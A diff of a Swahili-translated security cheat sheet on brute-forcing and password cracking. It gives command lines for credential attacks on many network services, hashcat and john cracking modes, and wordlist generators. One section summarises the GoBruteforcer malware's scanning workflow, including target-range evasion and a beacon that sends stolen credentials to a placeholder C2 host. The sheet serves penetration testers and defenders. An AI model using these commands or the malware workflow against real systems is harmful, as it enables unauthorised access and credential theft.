@@ -1,10 +1,8 @@
 # Brute Force - CheatSheet
 
-{{#include ../banners/hacktricks-training.md}}
+## Default Credentials
 
-## Vitambulisho chaguomsingi
-
-**Tafuta kwenye google** vitambulisho chaguomsingi vya technology inayotumika, au **jaribu links hizi**:
+**Tafuta kwenye google** taarifa za Default Credentials za technology inayotumika, au **jaribu links hizi**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +17,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Tengeneza Dictionaries zako**
+## **Tengeneza Dictionaries zako mwenyewe**
 
-Kusanya taarifa nyingi iwezekanavyo kuhusu target na utengeneze dictionary maalum. Tools ambazo zinaweza kusaidia:
+Tafuta taarifa nyingi iwezekanavyo kuhusu target na utengeneze dictionary maalum. Tools zinazoweza kusaidia:
 
 ### Crunch
 ```bash
@@ -47,13 +45,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Tengeneza nywila kulingana na maelezo unayoyajua kuhusu mwathiriwa (majina, tarehe...).
+Tengeneza passwords kulingana na taarifa unazojua kuhusu mwathiriwa (majina, tarehe...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Tool ya kuzalisha wordlist, inayokuruhusu kutoa seti ya maneno na kukupa uwezekano wa kuunda variations nyingi kutokana na maneno hayo, hivyo kuunda wordlist ya kipekee na inayofaa kutumia kwa target mahususi.
+Zana ya kutengeneza wordlist, inayokuruhusu kutoa seti ya maneno na kukupa uwezekano wa kuunda variations nyingi kutokana na maneno hayo, hivyo kutengeneza wordlist ya kipekee na inayofaa kwa matumizi dhidi ya target mahususi.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +72,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Orodha za maneno
+### Wordlists
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,13 +85,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Mtiririko wa kazi wa bruteforcer wa kiwango cha Internet (mafunzo kutoka kwa scanners za Go)
+## Mtiririko wa Internet-wide bruteforcer (mafunzo kutoka kwa scanners zinazotegemea Go)
 
-- Dumisha **worker pools zilizorekebishwa kulingana na architecture** (kwa mfano, takriban goroutines 95 kwenye `x86_64/arm64`, 85 kwenye `i686`, 50 kwenye ARM za kiwango cha chini) na uzianzisha upya kila sekunde ili kudumisha **concurrency isiyobadilika**, huku kila worker ikishughulikia IP moja ya target kabla ya kutoka.<sup>[[1]](#references)</sup>
-- Tengeneza **IPv4 za public za nasibu**, lakini ondoa ranges zilizo wazi kuwa na honeypot nyingi au zisizoroutable: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8`s zenye cloud nyingi (`3/15/16/56`) na `/8`s zinazohusishwa na DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Probe port ya service** kwa timeout fupi (~2s) kabla ya kujaribu **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin kupitia HTTP/80), na tumia **orodha ndogo ya credentials iliyojengwa ndani** ikiwa fetch ya remote dictionary/C2 itashindwa.
-- **Exfiltrate hits** kupitia HTTP GET beacons ndogo kama `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes kama `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) huku ukitumia tena User-Agent ya kawaida ya browser ili kuchanganyika na traffic nyingine.
-- **phpMyAdmin spray** inaweza kufanya brute-force kwenye paths nyingi zinazowezekana (zaidi ya ~80) kwa `GET /index.php?lang=en`, kutambua PMA markers (theme ya `pmahomme`/`phpmyadmin.css`/`navigation.php`) na ku-parse `codemirror.css?v=X.Y.Z` ili kuchagua auth: versions `<4.9` zinakubali GET params `pma_username`/`pma_password`; versions `>=4.9` zinahitaji POST yenye `server=1`, CSRF `token`, na credentials hizo hizo.
+Tabia zifuatazo zilionekana katika workflow ya scanning ya malware ya GoBruteforcer; thamani halisi hutegemea sampuli.<sup>[[1]](#references)</sup>
+
+- Dumisha **worker pools zilizowekwa kulingana na architecture** (kwa mfano, workers 95 wanaofanya kazi kwa wakati mmoja kwenye `x86_64/arm64`, 85 kwenye `i686`, 35 kwenye `armv5tel`, na 50 kwa default kwenye architectures nyingine), kagua workers wanaofanya kazi kila sekunde, na uunde replacements wanapokuwa chini ya target; kila worker hushughulikia IP target moja tu kabla ya kutoka.
+- Tengeneza **IPv4s za umma za random**, lakini ondoa ranges zilizo wazi kuwa haziwezi kuroutiwa na zilizochaguliwa kuepukwa na operator: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8`s zenye cloud nyingi (`3/15/16/56`) na `/8`s zinazohusishwa na DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Probe service port** kwa timeout fupi (~2s) kabla ya kujaribu **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin kupitia HTTP/80), na tumia **builtin credential list ndogo** ikiwa credential fetch kutoka C2 itashindwa.
+- **Exfiltrate hits** kupitia HTTP GET beacons ndogo kama `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes kama `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) huku ukitumia tena User-Agent ya browser ya kawaida ili kuchanganyika na traffic nyingine.
+- **phpMyAdmin spray** inaweza kufanya brute-force kwenye takribani paths 80 zinazowezekana kwa `GET /index.php?lang=en`, kutambua PMA markers (theme ya `pmahomme`/`phpmyadmin.css`/`navigation.php`) na ku-parse `codemirror.css?v=X.Y.Z` ili kuchagua auth: versions `<4.9` hukubali GET params `pma_username`/`pma_password`; versions `>=4.9` hutumia POST yenye `server=1`, CSRF `token`, na credentials hizo hizo.
 
 ## Services
 
@@ -197,9 +197,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
 
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
-
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
 
@@ -292,7 +289,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Ili kutumia **oracle_login** na **patator**, unahitaji **kusakinisha**:
+Ili kutumia **oracle_login** pamoja na **patator**, unahitaji **kusakinisha**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -323,7 +320,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-Unaweza kupakua kifurushi cha `.deb` cha kusakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](/pool/main/t/thc-pptp-bruter/)
+Unaweza kupakua kifurushi cha `.deb` ili kusakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/).
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -418,13 +415,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Weak SSH keys / Debian predictable PRNG
+#### Weak SSH keys / Debian PRNG inayotabirika
 
-Baadhi ya mifumo ina dosari zinazojulikana katika seed ya random inayotumika kutengeneza cryptographic material. Hali hii inaweza kusababisha keyspace kupungua kwa kiwango kikubwa, na inaweza kufanyiwa brute force kwa kutumia tools kama vile [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti za weak keys zilizotengenezwa mapema pia zinapatikana, kama vile [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Baadhi ya mifumo ina dosari zinazojulikana katika seed ya random inayotumika kutengeneza nyenzo za cryptographic. Hili linaweza kusababisha keyspace kupungua kwa kiasi kikubwa, na hivyo kufanyiwa bruteforce kwa kutumia tools kama vile [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti za weak keys zilizotengenezwa awali zinapatikana pia, kama vile [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP text protocol ni messaging protocol inayotumika kwa mapana ambayo **inaruhusu mawasiliano na mwingiliano usio na usumbufu na popular message queueing services** kama vile RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa mbinu iliyosanifishwa na yenye ufanisi ya kubadilishana messages na kutekeleza messaging operations mbalimbali.
+STOMP text protocol ni messaging protocol inayotumika sana ambayo **inaruhusu mawasiliano na mwingiliano usio na vikwazo na huduma maarufu za message queueing** kama vile RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia sanifu na bora ya kubadilishana messages na kutekeleza shughuli mbalimbali za messaging.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -462,16 +459,16 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-## Local
+## Ya Ndani
 
-### Hifadhidata za online za cracking
+### Database za cracking mtandaoni
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 yenye au bila ESS/SSP na yenye thamani yoyote ya challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, na archives za MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes na file hashes)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
@@ -498,7 +495,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyo ndani ya** zip iliyosimbwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizo ndani ya** zip iliyosimbwa kwa kuendesha: **`7z l encrypted.zip`**\
+Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyo ndani** ya zip iliyosimbwa kwa njia fiche. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizo ndani ya** zip iliyosimbwa kwa njia fiche kwa kuendesha: **`7z l encrypted.zip`**\
 Pakua [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)kwenye ukurasa wa releases.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -533,7 +530,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-Ili kuvunja password ya Owner ya PDF, angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Ili crack password ya Owner ya PDF, angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -569,7 +566,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Picha ya LUKS
 
-#### Njia ya 1
+#### Mbinu ya 1
 
 Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -595,7 +592,7 @@ Mafunzo mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linu
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### Ufunguo binafsi wa PGP/GPG
+### Ufunguo wa faragha wa PGP/GPG
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -608,11 +605,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha john
 
-### Safu ya Open Office Iliyolindwa kwa Password
+### Open Office Pwd Protected Column
 
 Ikiwa una faili ya xlsx yenye safu iliyolindwa kwa password, unaweza kuiondoa ulinzi:
 
-- **Pakia kwenye Google Drive** na password itaondolewa kiotomatiki
+- **Ipakie kwenye Google Drive** na password itaondolewa kiotomatiki
 - Ili **kuiondoa** **mwenyewe**:
 ```bash
 unzip file.xlsx
@@ -638,16 +635,16 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 hash-identifier
 > <HASH>
 ```
-### Orodha za maneno
+### Orodha za Maneno
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Tools za kutengeneza Wordlist**
+### **Zana za Kutengeneza Orodha za Maneno**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generator mahiri ya keyboard-walk yenye base chars, keymap na routes zinazoweza kusanidiwa.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generator ya hali ya juu ya keyboard-walk yenye base chars, keymap na routes zinazoweza kusanidiwa.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -660,17 +657,17 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Mashambulizi ya Hashcat
+#### Hashcat attacks
 
-- **Wordlist attack** (`-a 0`) yenye rules
+- **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat** tayari inakuja na **folder iliyo na rules**, lakini unaweza kupata [**rules nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** tayari huja na **folda iliyo na rules**, lakini unaweza kupata [**rules nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
-Inawezekana **kuchanganya wordlists 2 kuwa 1** kwa kutumia hashcat.\
+Inawezekana **kuchanganya wordlist 2 kuwa 1** kwa kutumia hashcat.\
 Ikiwa list 1 ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yatatengenezwa.
 ```bash
 # This will combine 2 wordlists
@@ -714,7 +711,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- Shambulizi la Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)
+- Attack ya Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -722,7 +719,7 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Modi za Hashcat
+#### Modes za Hashcat
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
@@ -733,12 +730,12 @@ Kuvunja Hashes za Linux - faili ya /etc/shadow
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Cracking Hash za Windows
+Kuvunja Hash za Windows
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Cracking Hashes za Programu za Kawaida
+Kuvunja Hash za Application za Kawaida
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -748,8 +745,7 @@ Cracking Hashes za Programu za Kawaida
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
-## Marejeleo
+## References
 
-- [1] [Ndani ya GoBruteforcer: mipangilio chaguo-msingi ya server iliyotengenezwa na AI, passwords dhaifu, na campaigns zinazolenga crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
-
+- [1] [Ndani ya GoBruteforcer: chaguo-msingi za seva zilizozalishwa na AI, nywila dhaifu, na kampeni zinazolenga crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
